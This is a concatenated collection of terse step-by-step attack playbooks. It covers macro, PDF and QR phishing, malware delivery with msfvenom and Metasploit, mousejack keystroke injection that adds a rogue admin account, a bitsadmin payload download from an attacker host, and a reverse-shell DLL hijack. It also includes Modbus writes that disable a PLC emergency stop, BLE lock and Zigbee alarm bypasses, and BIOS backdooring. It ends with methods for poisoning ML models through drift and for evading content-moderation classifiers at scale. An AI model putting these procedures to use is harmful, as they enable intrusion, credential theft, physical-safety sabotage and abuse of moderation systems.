Step 1: Gain physical presence as "IT Support" and casually distract user.Step 2: Behind the scenes, use inject.py to simulate keyboard commands (e.g., adding remote access via RDP).Step 3: Victim thinks you’re just troubleshooting.Step 4: Inject script that creates firewall rule to allow inbound traffic and user account for RDP.Step 5: Leave silently, remote access open.Step 6: Access later at will.

Step 1: Gain shell access to HMI terminal via SSH or RDP.Step 2: Use Modpoll (modpoll -m tcp -a 1 -r 40001 192.168.1.20) to read/write registers.Step 3: Inject crafted write payload (modpoll -m tcp -a 1 -r 40002 -t 3 -1 192.168.1.20) to modify control values.Step 4: Confirm effect on process (e.g., fan speed, pressure reading).Step 5: Use Wireshark to verify raw packets sent match payload intent.Step 6: Log register changes and map to process diagram.Step 7: Check if logs or alarms reflect unauthorized write.

Step 1: Gains read access to System Volume Information. Step 2: Copies old SAM and SYSTEM registry hives from restore point. Step 3: Mounts them and reads user hashes. Step 4: Cracks and replaces credentials.

Step 1: Generate QR code pointing to a keylogger APK.Step 2: Label it “Free Wi-Fi, Scan Here!”.Step 3: Stick it in coffee shops, stations, or events.Step 4: Victim scans and downloads APK.Step 5: Keylogger records keystrokes silently.

Step 1: Generate QR code to fake login page.Step 2: Insert QR in email signature as “Company App Login”.Step 3: Send business emails to targets.Step 4: Curious victim scans it.Step 5: Fake login page opens; victim enters credentials.Step 6: Info is sent to attacker.Step 7: Account is accessed and further phish sent.

Step 1: Generate QR codes with encoded base64 commands.Step 2: Embed QR codes into images (e.g., memes).Step 3: Bot downloads image and extracts/decodes QR.Step 4: Executes the decoded command.Step 5: Hacker posts new meme to issue updated commands.

Step 1: Generate a Wi-Fi QR code for SSID “FreeLibraryWiFi”. Step 2: Set up beacon flood with same SSID using mdk3. Step 3: Display QR code in physical location. Step 4: Victims scan the code and connect to the fake SSID. Step 5: Redirect them to a phishing portal via Wifiphisher.

Step 1: Generate a fake invoice or resume PDF. Step 2: Inject hidden polymorphic code using EvilPDF. Step 3: Obfuscate the binary payload using Hyperion. Step 4: Email the file with subject: “Payment Overdue - Action Needed”. Step 5: When opened, the PDF executes script silently in the background. Step 6: The payload changes format each time it's triggered. Step 7: Malware installs spyware/keylogger silently.

Step 1: Generate a list of possible usernames (a, aa, ab, abc, adam, alice).Step 2: Send emails to each of these addresses.Step 3: Monitor bounce-back behavior — no bounce may mean valid address.Step 4: Sort addresses based on no response vs bounce.Step 5: Build a list of potential valid addresses for future phishing.

Step 1: Generate a phishing webmail login page hosted on a local server.Step 2: Create a QR code that links to this fake login page.Step 3: Print and label the QR code as “Quick Access to Email” and stick it in office/lab.Step 4: Victim scans the QR using their phone, opens fake login page.Step 5: Victim inputs credentials believing it is real webmail.Step 6: Log credentials and redirect to error page.Step 7: Log into IMAP mail server with captured credentials in lab.

Step 1: Generate malicious Excel using Metasploit’s CVE-2017-11882 module.Step 2: Fill sheet with fake financial data to appear normal.Step 3: Rename as “Quarterly_Tax_Report.xls”.Step 4: Attach in a spoofed email: “Tax deadline update, please review.”Step 5: Send to finance department.Step 6: When user opens file, embedded payload executes silently due to vulnerability.Step 7: Creates reverse connection to attacker.Step 8: Attacker can install backdoor or extract files.

Step 1: Generate reverse shell payload with Metasploit. Step 2: Encode shellcode with polymorphic mutation (e.g., XOR, encoding layers). Step 3: Embed into PDF using EvilPDF. Step 4: Name file “Freshers_Resume.pdf” and email to HR departments. Step 5: When opened, shell connects back to attacker. Step 6: Payload re-encodes itself for each email sent. Step 7: Bypasses detection due to structural changes.

Step 1: Gently open the device casing to reveal the PCB. Step 2: Use a magnifier to closely inspect tiny golden or silver dots near chip areas. Step 3: Use a multimeter to trace pads connected to main chip. Step 4: Identify functions using known pinout patterns (GND usually connects to ground plane). Step 5: Mark and log the pads for further testing.

Step 1: Get CEO’s name from LinkedIn and use email spoofing (spoofed reply-to header).Step 2: Generate a malicious .exe payload using msfvenom.Step 3: Compress it inside a ZIP and upload to Dropbox.Step 4: Create a shortened link using Bit.ly to avoid detection.Step 5: Draft email saying, “Please review this urgent contract -CEO”.Step 6: Send the email to a mid-level manager.Step 7: If victim clicks and downloads the file, executes the EXE.Step 8: A Meterpreter session is established back to attacker.

Step 1: Get a scanner that allows custom payloads. Step 2: Program it with barcodes that type terminal commands. Step 3: Connect it to PC via USB. Step 4: Scan the malicious barcode – it runs commands as if typed.

Step 1: Get email saying “New Canon Printer Drivers – Required Update.”Step 2: Download driver ZIP and extract.Step 3: Right-click → Run as Admin.Step 4: It installs a legitimate driver along with rootkit.Step 5: Rootkit runs at startup and logs user activity.

Step 1: Get within RF range of the target system (~20m).Step 2: Use mousejack-scan.py to detect vulnerable mouse dongles.Step 3: Run inject.py to open a command prompt using Windows + R → cmd.Step 4: Inject net user hacker P@ssw0rd /add and press Enter.Step 5: Inject net localgroup administrators hacker /add to elevate privileges.Step 6: Exit silently.Step 7: Attacker can now log in later with elevated access.

Step 1: Gets credentials from shared documentation (admin/Admin@321). Step 2: Runs Enter-PSSession -ComputerName TARGET -Credential admin. Step 3: Starts PowerShell session on target. Step 4: Runs script to add admin user or open firewall. Step 5: Maintains persistence.

Step 1: Go to https://wetransfer.com or https://pcloud.comStep 2: Upload zipped confidential files.Step 3: Enter own personal email as recipient.Step 4: Click "Send" and confirm email.Step 5: Access and download files at home.

Step 1: Go to https://www.shodan.io and create a free account.Step 2: Search for port:502 country:"IN" to find Indian Modbus devices.Step 3: Refine search using ICS-related banners like product:Modbus or title:SCADA.Step 4: Review IP addresses, open ports, and banners of exposed ICS systems.Step 5: Log vulnerable systems for reporting or further analysis.

Step 1: Goes to free QR generator site. Step 2: Inputs phishing/malicious internal URL. Step 3: Generates QR and pastes into Word docs, presentations, or posters. Step 4: Shares or prints document internally. Step 5: Users scan QR and open the URL unknowingly.

Step 1: HR employee logs into employee management portal.Step 2: Searches for finance.user1 and clicks "Reset Password".Step 3: Sets new password Finance@123.Step 4: Logs in as finance.user1 into payroll dashboard.Step 5: Views or downloads confidential salary and tax information.

Step 1: HR installs free “OfficeTime Logger” software.Step 2: During install, it injects rootkit into Windows Service.Step 3: Rootkit logs HR account activity and credentials.Step 4: Sends logs to attacker every evening.Step 5: Attacker accesses payroll and internal systems.

Step 1: HR policy doc sent with embedded macro beacon.Step 2: When user opens and enables macro, it sends silent ping to server.Step 3: Attacker knows target engaged with content.Step 4: No payload, just beaconing.Step 5: Attacker prepares follow-up tailored attacks.

Step 1: HTML attachment contains <iframe src="https://malicious-cdn.xyz/script.js">.Step 2: When opened, iframe runs a loader script that builds an EXE in memory.Step 3: Script creates a downloadable malware file (update_tool.exe).Step 4: Victim sees a fake “Download Update” message.Step 5: Upon clicking, malware is downloaded and run.Step 6: Attacker gets access to system and internal files.Step 7: Malware remains persistent on reboot.

Step 1: HTML attachment contains minimal code that builds <script src> dynamically.Step 2: Script loads remote dropper.js file from attacker's server.Step 3: dropper.js reconstructs a .vbs file and downloads malware.Step 4: Email sent as “Compliance Policy Update.”Step 5: Victim opens file, script downloads and runs dropper.Step 6: Malware infects system and hides in AppData folder.Step 7: Attacker maintains stealth access.

Step 1: HTML file contains hidden PowerShell payload embedded using Base64.Step 2: JavaScript writes and drops a .ps1 script when user opens the file.Step 3: Victim sees a fake “Secure Attachment” message and clicks to unlock.Step 4: Unlock triggers the dropped PowerShell script using mshta.exe.Step 5: Script configures Outlook to auto-forward all incoming mails to attacker email.Step 6: No visible indication to user; data exfiltration begins.Step 7: Attacker monitors inbox contents, including credentials and sensitive info.

Step 1: HTML mimics Excel UI with buttons like “Enable Macros.”Step 2: Button click initiates JavaScript that builds and downloads malware.exe.Step 3: Email pretends to be an “Annual Budget Review.”Step 4: Victim opens HTML file and sees simulated Excel interface.Step 5: Clicking “Enable Macros” actually downloads payload.Step 6: Victim runs file believing it's a required macro tool.Step 7: Malware installs remote keylogger.

Step 1: Hacker builds Excel with malicious VBA script. Step 2: Email says urgent PO for supplier. Step 3: Victim opens file and enables macros. Step 4: Script runs command to download malware. Step 5: Attacker gains shell access.

Step 1: Hacker builds fake Adobe invoice PDF. Step 2: Sends to IT/Finance staff. Step 3: Victim opens PDF and gets infected. Step 4: Malware encrypts files and demands ransom. Step 5: System becomes unusable.

Step 1: Hacker crafts a PDF that looks like a bank statement. Step 2: Sends it claiming unusual transactions. Step 3: Victim opens PDF, which executes exploit. Step 4: Malware is downloaded automatically. Step 5: Banking info is stolen.

Step 1: Hacker creates PDF pretending to be from Gmail. Step 2: Warns victim of "account suspension". Step 3: Victim opens PDF urgently. Step 4: PDF auto-runs exploit and installs malware. Step 5: Attacker gets access to credentials.

Step 1: Hacker creates PDF simulating a tax refund. Step 2: Spoofs email as income tax dept. Step 3: Victim opens file expecting refund info. Step 4: Malware is executed via PDF exploit. Step 5: Victim’s system becomes accessible to attacker.

Step 1: Hacker creates PDF with malicious QR code. Step 2: Sends as “missed delivery notice.” Step 3: Victim scans QR code on phone. Step 4: Device is redirected to malware download. Step 5: Phone is infected without user knowing.

Step 1: Hacker creates Word doc labeled “Legal Memo - Urgent”. Step 2: Sends to staff from spoofed legal@company email. Step 3: Victim opens and enables content. Step 4: Macro runs a hidden command to download malware. Step 5: Attacker executes malicious payload remotely.

Step 1: Hacker creates a doc titled “Exit Formalities.” Step 2: Email sent from spoofed HR address. Step 3: Victim opens and enables content. Step 4: Malware downloads silently. Step 5: Attacker gains system access.

Step 1: Hacker creates a fake receipt with a malicious macro. Step 2: Sends email claiming a payment was received. Step 3: Victim opens file and enables content. Step 4: Macro installs malware silently. Step 5: Sensitive company data is stolen.

Step 1: Hacker creates a professional-looking invite in PDF. Step 2: Email claims to be from a known vendor. Step 3: Victim opens PDF to view details. Step 4: Hidden exploit executes silently. Step 5: Malware is installed for attacker access.

Step 1: Hacker creates a zip file with a disguised malware executable. Step 2: Sends an email pretending to be from a courier service. Step 3: Victim opens the zip and double-clicks the file inside. Step 4: The malware runs and installs silently. Step 5: Victim sees nothing suspicious, attacker gains control.

Step 1: Hacker drafts PDF that appears to be a real annual report. Step 2: Email sent to investors or management. Step 3: Victim opens the PDF. Step 4: JavaScript exploit runs and installs malware. Step 5: Sensitive company data gets stolen.

Step 1: Hacker drafts fake school fee receipt. Step 2: Sends email pretending to be from school. Step 3: Victim opens PDF expecting receipt. Step 4: Malware installs silently. Step 5: Keystrokes sent to attacker.

Step 1: Hacker makes an Excel form titled “Govt Job Application.” Step 2: Sends to job seekers with govt-like email address. Step 3: Victim opens and enables content. Step 4: Macro downloads and installs malware. Step 5: Attacker gains full access to victim PC.

Step 1: Hacker makes fake Excel survey form. Step 2: Email offers gift card for participation. Step 3: Victim opens Excel and enables macros. Step 4: Malware downloads via macro. Step 5: Attacker installs spyware and tracks user.

Step 1: Hacker prepares an Excel KPI report. Step 2: Sends it to employees from spoofed analytics@company.com. Step 3: Victim opens and enables content. Step 4: Macro runs and sends system info to attacker. Step 5: Attacker collects and misuses data.

Step 1: Hacker spoofs CEO email. Step 2: Sends "urgent instructions" doc to key staff. Step 3: Victim opens and enables macros. Step 4: Malware opens a remote shell for attacker. Step 5: Attacker uses it to exfiltrate files.

Step 1: Hacker writes email asking for donation for disaster victims. Step 2: Includes Word attachment with malicious macro. Step 3: Victim opens and clicks "Enable Editing." Step 4: InfoStealer collects personal files and sends them to attacker. Step 5: Victim suffers privacy breach.

Step 1: Hold specific buttons (e.g., power + reset) while powering device to trigger recovery. Step 2: Connect via UART and access root console (login: root). Step 3: Use dd if=/dev/mtd0 of=/tmp/dump.img to create dump. Step 4: Transfer via TFTP, SCP, or UART to local machine. Step 5: Use binwalk to extract image. Step 6: Analyze for insecure logic or embedded credentials.

Step 1: Hold the PCB against a strong flashlight. Step 2: Take high-resolution photo from opposite side. Step 3: Enhance contrast in editing software to make internal copper traces visible. Step 4: Use trace info to identify signal paths and test points.

Step 1: Hospital tablet in ward is discovered via blueborne-scanner. Step 2: Run exploit from Metasploit on a Linux machine nearby. Step 3: Upon shell access, list files and open local EMR (electronic medical record) app data. Step 4: Dump patient info or add fake entries (for ethical test only). Step 5: Reset system to demonstrate cleanup phase.

Step 1: Host a JavaScript page that captures accelerometer and gyroscope data using DeviceMotionEvent.Step 2: Open the URL on Safari browser on iPhone.Step 3: Type text in a separate Notes app while the sensor page is active in background tab.Step 4: Script captures movement and infers keypress patterns.Step 5: Visualize the motion data on browser console.Step 6: Correlate patterns with typing rhythm.Step 7: Repeat with different keys and phrases.Step 8: Analyze feasibility of data leakage without any granted permissions.

Step 1: Host a fake Google “verify identity” page.Step 2: Send an alert email with subject “Unusual Sign-in Attempt Detected”.Step 3: Link redirects to fake login page.Step 4: Victim believes it’s real and inputs email/password.Step 5: Credentials are forwarded live to attacker.Step 6: Attacker logs in real-time using same session cookies.Step 7: Access to full Gmail account is gained.

Step 1: Host a site offering “₹1000 Amazon Coupon Generator.”Step 2: The app GUI accepts fake input (e.g., phone number, OTP) to appear functional.Step 3: While running, the app silently executes a PowerShell payload.Step 4: Payload creates scheduled task for persistence.Step 5: App pretends to generate a coupon, then “fails.”Step 6: Meanwhile, malware monitors browser sessions.Step 7: Attacker collects Amazon login credentials.

Step 1: Host a test file on attack server (e.g., payload.exe).Step 2: On victim CMD, run:bitsadmin /transfer myjob /download /priority normal http://attacker-ip/payload.exe C:\Users\Public\payload.exeStep 3: Wait until download finishes.Step 4: Run: C:\Users\Public\payload.exe to simulate infection.Step 5: Review BITS logs in Event Viewer.Step 6: Delete the file after test.

Step 1: Host a webpage with a fake IMAP login form with same field names as actual email client login pages.Step 2: Embed JavaScript that auto-focuses the form and waits for autofill.Step 3: Share the link with victim via phishing email or QR code near a coffee shop.Step 4: Victim’s browser autofills stored credentials into the form.Step 5: JavaScript sends credentials silently to attacker’s server.Step 6: Use credentials to log in to IMAP server in test environment.

Step 1: Host fake SSO login page mimicking Azure using AzureAD phish templates.Step 2: Configure MITMproxy to intercept token post-login.Step 3: Send Teams message: “Important Policy Change - Review Now!”Step 4: Link opens in browser; victim sees real-looking Azure login.Step 5: Victim logs in, unaware that token is proxied.Step 6: Attacker captures token through MITMproxy.Step 7: Use token to access SharePoint, Outlook, OneDrive.

Step 1: Identify BIOS chip near motherboard battery (often 8-pin SOIC).Step 2: Clip on SPI programmer with SOIC clip.Step 3: Dump current BIOS image.Step 4: Modify BIOS with backdoor or password bypass.Step 5: Flash modified BIOS back.Step 6: Boot system and confirm elevated access.Step 7: Cleanup and unclip programmer.

Step 1: Identify BLE channel used between control app and QKD hardware.Step 2: Place two BLE relays – one near app, one near hardware.Step 3: Use MITM proxy to relay BLE packets in real-time, altering timestamps/data.Step 4: Change photon pattern identifiers to match predictable sequences.Step 5: Intercept classical transmission to validate fake qubit matches.Step 6: Continuously log accepted keys by Bob.Step 7: Maintain relay until entire session ends.

Step 1: Identify BLE smart plug used near photon detector for power management.Step 2: Gain access using default password or BLE sniffing.Step 3: Modify firmware to pulse LEDs during specific timing intervals.Step 4: Direct pulses toward photon detector to mimic weak photon arrival.Step 5: Sync with reconciliation protocol to match known base.Step 6: Allow system to accept photon events as real.Step 7: Remove plug remotely after key generation.

Step 1: Identify BLE smartwatch with visible MAC via scan. Step 2: Recreate GATT profile of a smartwatch using GATTacker. Step 3: Craft fake calendar GATT characteristics with event title "Meeting with CEO". Step 4: Broadcast cloned device and trick smartwatch into pairing. Step 5: Watch syncs to malicious GATT profile and displays fake meeting. Step 6: Victim is misled into reacting or attending wrong meeting.

Step 1: Identify BLE-enabled smart lock nearby using hcitool lescan. Step 2: Record the MAC address of the lock. Step 3: Use gatttool -I to connect to the MAC address. Step 4: Discover available GATT characteristics using characteristics. Step 5: Identify characteristic that controls the lock state. Step 6: Send write command to that characteristic (e.g., char-write-req 0x0025 01) to unlock. Step 7: Observe the lock opens without user action.

Step 1: Identify DRAM rows through memory analysis tools. Step 2: Write a memory access pattern that targets rows adjacent to secret data. Step 3: Hammer (rapidly access) these rows to create disturbances. Step 4: Observe delays or bit-flips in timing-sensitive adjacent memory areas. Step 5: Extract data based on error patterns and timing shifts.

Step 1: Identify DevAddr used by sniffing real uplinksStep 2: Use Arduino + LoRa to craft packet with same DevAddrStep 3: Modify payload to include fake temperature valuesStep 4: Send crafted packet on correct frequency and SFStep 5: Observe backend interpreting fake packet as valid

Step 1: Identify E-Stop status register (e.g., 40060 = 1 = enabled).Step 2: Craft Modbus packet setting it to 0 (disabled).Step 3: Spoof source IP of authorized configuration tool.Step 4: Send to PLC before operator presses real E-Stop.Step 5: Emergency stop has no effect.Step 6: Safety protocol fails silently.

Step 1: Identify EEPROM chip (often 24Cxx series) on PCB inside access device.Step 2: Connect clip adapter to the chip without desoldering.Step 3: Use MiniPro software to detect and read data from EEPROM.Step 4: Export hex dump and convert into readable form using hex editor.Step 5: Look for plaintext credentials, IDs, or fingerprint data patterns.Step 6: Reflash original dump to avoid detection.

Step 1: Identify GPIO header on board. Step 2: Refer to datasheet or measure voltages to find useful pins. Step 3: Pull reset pin low to reboot, or data pin high to trigger unlock. Step 4: In some cases, toggle pins to enter maintenance/debug mode. Step 5: Combine with other interfaces for access.

Step 1: Identify HMI config import feature (e.g., alarm profiles via XML).Step 2: Use Notepad++ to write an XML bomb (e.g., Billion Laughs attack).Step 3: Load the malicious file using HMI interface or via USB.Step 4: Upon parsing, the HMI freezes or crashes.Step 5: Test reboot cycles and check if recovery is possible.Step 6: Log system behavior and operator confusion.Step 7: Evaluate the parser’s input validation.

Step 1: Identify HMI display logic tied to a flag register (e.g., 43000 = 1 = enable menu).Step 2: Spoof packet writing 1 to that register.Step 3: HMI now displays a control feature that shouldn't exist.Step 4: Operator unknowingly interacts with this phantom feature.Step 5: Actions appear to succeed but do nothing.Step 6: Confusion or misuse of process results.

Step 1: Identify HMI interface hosted via browser using Internet Explorer (e.g., http://192.168.1.10/hmi.html).Step 2: Use Burp Suite to intercept the page and extract the ActiveX object reference (e.g., ProgID="HMI.Control").Step 3: Search Exploit-DB for known ActiveX vulnerabilities for the control.Step 4: Load exploit/windows/browser/ms10_046_shortcut_icon_dllloader in Metasploit.Step 5: Set RHOST to victim HMI and LHOST to attacker’s IP.Step 6: Deliver the payload via phishing or crafted email.Step 7: Once executed, control is obtained and payload persists.

Step 1: Identify HMI software installed (e.g., Siemens WinCC).Step 2: Use ProcMon to check for DLLs loaded from insecure directories.Step 3: Craft a malicious DLL using msfvenom with a reverse shell payload.Step 4: Replace a missing or weakly verified DLL in the application folder (e.g., libcrypto.dll).Step 5: Wait for the engineer to launch the HMI editor; the malicious DLL gets loaded.Step 6: Remote shell is opened to attacker’s system, allowing modification of HMI projects or logic.

Step 1: Identify I2C EEPROM on the board (e.g., AT24C256). Step 2: Connect Arduino to SDA, SCL, GND, VCC pins of EEPROM. Step 3: Upload I2C scanner sketch to detect device address. Step 4: Upload EEPROM dumper sketch to read and save all memory to .bin file. Step 5: Save data to PC via serial terminal or SD card. Step 6: Analyze contents using binwalk or strings.

Step 1: Identify ICS device with HTTP service using nmap -p 80,443 10.10.1.0/24.Step 2: Run curl -X OPTIONS http://[target] -i.Step 3: Observe if insecure methods like PUT or DELETE are enabled.Step 4: If PUT is allowed, try uploading a harmless test file to check write access.Step 5: Log all vulnerable web services for remediation or exploit development.

Step 1: Identify IoT device supporting QR code onboarding.Step 2: Analyze QR code structure to extract expected SSID and key.Step 3: Generate fake QR code pointing to attacker’s legacy WPA2 AP.Step 4: Print/overlay code in packaging/online listing.Step 5: User scans and connects to rogue AP.Step 6: Attacker simulates onboarding process.Step 7: Capture initial setup credentials and cloud tokens.Step 8: Gain remote access to device.

Step 1: Identify IoT devices that support OTA firmware checks over Wi-Fi.Step 2: Monitor beacon trigger pattern using Wireshark.Step 3: Recreate beacon with fake vendor ID and firmware revision using Scapy.Step 4: Set up rogue AP with matching SSID in legacy WPA2 mode.Step 5: Wait for IoT device to connect and request update.Step 6: Serve fake firmware using HTTP server.Step 7: Log device response and control channel.Step 8: Use this to explain weak OTA validation logic.

Step 1: Identify JTAG port on SoC-based device.Step 2: Attach tool and detect pinout.Step 3: Use scan software to probe registers.Step 4: Modify register controlling GPIO or memory.Step 5: Test response, e.g., LED blink or file dump.Step 6: Remove tool and seal.

Step 1: Identify JTAG port pins and connect JTAGulator.Step 2: Use boundary scan software to detect accessible functions.Step 3: Read/write I/O register states.Step 4: Dump RAM in small chunks through scan chains.Step 5: Extract strings, environment variables, or kernel params.Step 6: Use info to escalate or build targeted firmware.Step 7: Maintain persistence through partial memory patches.

Step 1: Identify JavaScript code that reads user input from URL, cookies, or localStorage and inserts into DOM without sanitization. Step 2: Inject payloads in URL fragments or parameters like #<script>alert(1)</script>. Step 3: Load the page and observe if the script executes as DOM is updated. Step 4: Use browser dev tools to inspect where input is used in DOM. Step 5: Craft payloads that exploit DOM APIs (e.g., document.write(), innerHTML). Step 6: Test with different browsers and inputs. Step 7: Document vulnerable scripts and input sources. Step 8: Recommend sanitizing data before inserting into DOM and using safe DOM methods like textContent. Step 9: Suggest Content Security Policy (CSP). Step 10: Update JavaScript libraries or frameworks.

Step 1: Identify Modbus device heartbeat interval (e.g., every 10s on register 43000).Step 2: When PLC is physically offline, use Python loop to send crafted “I’m alive” values.Step 3: SCADA system still sees register updates.Step 4: Device never flagged offline.Step 5: Control center unaware of actual outage.Step 6: Backup system never triggers.

Step 1: Identify NAND flash (e.g., K9F1G08U0D) on PCB. Step 2: Attach TSOP clip without desoldering. Step 3: Connect to reader and read memory. Step 4: Use NAND analysis tools to reconstruct file system. Step 5: Extract logs, images, code.

Step 1: Identify NFC chip on board (e.g., NXP, ST). Step 2: Locate debug lines connected to chip. Step 3: Attach logic analyzer and capture signals during use. Step 4: Replay captured NFC commands or modify them. Step 5: If registers are writable, inject custom command to modify NFC behavior.

Step 1: Identify POS terminal IP using a local network scanner.Step 2: Visit its browser panel via http://POS-IP/login.Step 3: Enter default installer credentials (installer/install123).Step 4: Simulate accessing transaction logs and inventory.Step 5: Export a list of purchases for demonstration.Step 6: Show how sales data and card swipe logs may be harvested.

Step 1: Identify PQC-enabled device enforcing MAC whitelist.Step 2: Monitor accepted MAC addresses using airodump-ng.Step 3: Spoof valid MAC using macchanger.Step 4: Attempt to connect using legacy WPA2 protocol.Step 5: Device accepts due to missing policy enforcement in legacy mode.Step 6: Establish session and inject test payloads.Step 7: Log device response and potential access.

Step 1: Identify QSM terminal using infrared-based or free-space QKD.Step 2: Use IR camera or sensor to find active receivers and hidden IR ports.Step 3: Test with universal IR remote signals to find any reaction (e.g., LED blink, screen toggle).Step 4: Trigger manufacturer-default debug mode (often left in test units).Step 5: Issue a silent shutdown or mode-change command via IR pulses.Step 6: Verify the device enters insecure messaging or restarts in fallback mode.

Step 1: Identify SDA/SCL lines from touchpad IC to MCU. Step 2: Attach logic analyzer probes to lines. Step 3: Start capture during use and decode I2C signals. Step 4: Observe coordinate data or gesture patterns. Step 5: Correlate with physical movements.

Step 1: Identify SOIC flash chip and clip with SOIC8 test clip. Step 2: Connect clip to FTDI SPI adapter and PC. Step 3: Launch flashrom with FTDI driver: flashrom -p ft2232_spi -r firmware.bin. Step 4: Use binwalk to extract and examine the firmware structure. Step 5: Reverse engineer the main executable with Ghidra.

Step 1: Identify SPI pins (MISO, MOSI, CLK, CS) near flash or display. Step 2: Attach logic analyzer probes to the pins. Step 3: Start capture software like PulseView. Step 4: Trigger capture during device operation. Step 5: Decode traffic using SPI protocol decoder to find plaintext data.

Step 1: Identify SPI pins to LCD (CLK, MOSI). Step 2: Connect analyzer probes and capture screen data. Step 3: Decode binary stream into bitmaps or text. Step 4: Use image tools to recreate visuals. Step 5: If login screen is shown, extract typed passwords.

Step 1: Identify SSID used by IoT devices (e.g., smart plug).Step 2: Launch a rogue WPA2 AP using same SSID.Step 3: Reboot IoT devices and observe if they connect to rogue AP.Step 4: Capture PMKID with hcxdumptool.Step 5: Crack key and join real WPA3 Wi-Fi.Step 6: Use compromised key for further attacks (e.g., MITM on cameras).Step 7: Report downgrade risks in IoT.
Step 1: Identify SWIM pin on ST MCU (e.g., STM8S). Step 2: Connect ST-Link V2 to SWIM, GND, VCC. Step 3: Use STVP to detect chip and read flash. Step 4: Save and analyze firmware dump.

Step 1: Identify UART RX/TX lines with multimeter. Step 2: Connect logic analyzer in parallel to capture data. Step 3: Power on the device and observe startup commands. Step 4: Send commands from physical buttons/app and watch corresponding UART output. Step 5: Analyze packet format, authentication strings, and internal logic.

Step 1: Identify UART interface and connect via TTL adapter. Step 2: Boot device and interrupt U-Boot with keystroke. Step 3: Use bootloader commands like loadb or dump to extract memory. Step 4: Send output to terminal and save as firmware.bin. Step 5: Analyze firmware with Binwalk or Strings to identify passwords or logic.

Step 1: Identify UART output lines using oscilloscope or multimeter. Step 2: Connect only RX and GND to avoid interference. Step 3: Start Minicom and log boot/output messages. Step 4: Analyze logs for credentials, API keys, and Wi-Fi configs. Step 5: Extract any leaked keys for further exploitation.

Step 1: Identify UART pins on the PCB using a multimeter. Step 2: Connect USB-to-TTL adapter to the TX, RX, and GND pins. Step 3: Use Minicom to connect to the serial console at common baud rates (e.g., 115200). Step 4: Reboot the device and observe boot messages. Step 5: Interrupt bootloader if possible (press a key). Step 6: Explore shell/bootloader menu for user accounts or environment variables. Step 7: Extract hardcoded credentials from boot logs or shell. Step 8: Use credentials to login via SSH or web admin.

Step 1: Identify Zigbee communication between the control panel and alarm unit.Step 2: Wait until a user disarms the alarm.Step 3: Capture disarm signal.Step 4: Replay that packet using GNU Radio tools.Step 5: Alarm thinks it's being disarmed by a valid user and goes silent.Step 6: Intruder can now move freely.

Step 1: Identify Zigbee network channel using a Zigbee sniffer (ZBOSS, KillerBee).Step 2: Craft invalid command packets that conform to Zigbee headers but contain junk payloads.Step 3: Send a flood of these to the QSM device’s Zigbee address.Step 4: Monitor device behavior—many will restart into safe mode.Step 5: Observe whether secure messaging is suspended or if device falls back to default key settings.Step 6: Intercept any insecure traffic or simulate legitimate connections.

Step 1: Identify a NetID range shared across networksStep 2: Use known DevAddr format to create a valid-looking packetStep 3: Inject into overlapping frequency used by nearby LoRaWANStep 4: Monitor if the nearby network server mistakenly processes itStep 5: Confirm data acceptance from cross-network packet

Step 1: Identify a client connecting to WPA3 AP.Step 2: Use aireplay-ng --deauth to inject disassociation frames during SAE handshake (after M1 but before M2).Step 3: Prevent full handshake from completing.Step 4: Repeatedly inject during reconnection to create long-term DoS.Step 5: Log effect on client connection retries.

Step 1: Identify a device using QRNG via electromagnetic (EM) emissions using an SDR scanner. Step 2: Analyze the frequency ranges QRNG operates in. Step 3: Use a Wi-Fi jammer configured to broadcast interference on those frequencies. Step 4: Monitor QRNG output over time using entropy analysis tools. Step 5: Confirm pattern deviation from ideal randomness. Step 6: Launch entropy-reduction exploit on target quantum encryption relying on QRNG output.

Step 1: Identify a feature used in the model that depends on semantic meaning — such as “location”, “age group”, “device type”, or “category.” These features are often standardized using domain knowledge. For example, a fraud detection model may use the “location” field where “US” means the United States. Step 2: Understand how the model interprets this feature — e.g., is it using a categorical encoder, one-hot encoding, or text mapping? What are the expected values (like “US”, “CA”, “UK”) and what labels do they carry in the model? Step 3: Begin altering the semantic representation of the feature outside the model — i.e., change how the data is reported or injected. Example: Instead of “US,” use “North America” or GPS coordinates, or “USA-1.” The model trained on “US” may now misinterpret or ignore the location feature. Step 4: If the system accepts flexible formats (e.g., strings, API metadata, web forms), test different semantic values for the same real-world meaning. Step 5: Use this to manipulate classification — e.g., make high-risk locations appear safe, or make one group of users invisible to geofencing or regulation-based filters. Step 6: Continue feeding these semantically-shifted values to cause concept drift. The model will now perform poorly because it sees distributional change but can’t link it back to the original meaning. Step 7: If retraining happens, the model may learn incorrect mappings (e.g., mapping “NA” → safe), which the attacker can exploit to bypass policies or manipulate results. Step 8: Scale this attack across accounts or inputs to poison the model over time while remaining undetected, since the inputs are not technically wrong — only semantically redefined.

Step 1: Identify a machine learning model that relies on static or rarely updated training data. For example, a hate speech detection model in a content platform that was trained a year ago and is not frequently retrained. Step 2: Observe what kind of language, vocabulary, and sentence patterns the model flags. You can do this by submitting variations of content and noting which ones are removed, flagged, or accepted. Step 3: Research new slang, trending obfuscation techniques, or alternate spellings commonly used to avoid content moderation. Examples include replacing offensive words with symbols (e.g., “h@te”), intentional misspellings (e.g., “r@cist”), or using meme formats and coded language (e.g., “skkkrrr nation” as a stand-in for racist terms). Step 4: Begin crafting messages or content that use these new forms and submit them to the platform. If the model is not updated to recognize these terms, the inputs will pass through undetected. Step 5: Monitor responses — if the content is accepted and not flagged, the model is indeed blind to these inputs due to drift (i.e., it hasn’t seen this style during training). Step 6: Continue refining your evasion techniques by staying current with evolving slang, subculture terms, or visual/emoji-based obfuscation (e.g., hiding toxic words in image memes or using Unicode characters that look similar). Step 7: Leverage the blind spot by repeatedly posting harmful, spammy, or misleading content using these new encodings. Since the model doesn’t adapt, it won’t catch the patterns, resulting in large-scale evasion. Step 8: Use automation or bots to scale this evasion campaign. Even if some content is caught, most will bypass detection because the blind spot remains until model retraining occurs. Step 9: For high-impact attacks, combine this with multiple accounts and slowly escalate toxicity over time, staying below moderation thresholds. This form of attack is silent and long-lasting.

